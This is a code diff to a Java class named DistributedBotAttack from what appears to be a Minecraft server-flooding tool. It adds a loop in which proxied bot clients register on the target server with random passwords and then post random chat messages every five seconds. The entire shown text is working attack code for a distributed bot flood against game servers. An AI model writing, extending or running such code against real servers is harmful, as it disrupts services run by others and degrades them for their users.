@@ -14,6 +14,7 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 import com.github.steveice10.mc.protocol.MinecraftProtocol;
+import com.github.steveice10.mc.protocol.packet.ingame.client.ClientChatPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
@@ -26,6 +27,7 @@ import com.github.steveice10.packetlib.tcp.TcpSessionFactory;
 import co.akarin.endminecraftultra.Protocol.ACP;
 import co.akarin.endminecraftultra.utils.mainUtils;
 import co.akarin.endminecraftultra.proxy.ProxyPool;
+import co.akarin.endminecraftultra.Config;
 import co.akarin.endminecraftultra.Protocol.MCForge;
 
 public class DistributedBotAttack extends IAttack{
@@ -46,6 +48,24 @@ public class DistributedBotAttack extends IAttack{
     }
 
     public void start(final String ip,final int port) {
+	    setTask(() -> {
+            while (true) {
+                for (Client c : clients) {
+                    if (c.getSession().isConnected()) {
+                        if (c.getSession().hasFlag("login")) {
+                            c.getSession().send(new ClientChatPacket(Config.instance.getRandMessage()));
+                        } else if (c.getSession().hasFlag("join")) {
+                            String pwd = mainUtils.getRandomString(7, 12);
+                            c.getSession().send(new ClientChatPacket(Config.instance.getRegisterCommand(pwd)));
+                            c.getSession().setFlag("login", true);
+                        }
+
+                    }
+                }
+                mainUtils.sleep(5 * 1000);
+            }
+        });
+
         this.starttime=System.currentTimeMillis();
 
         mainThread=new Thread(()->{
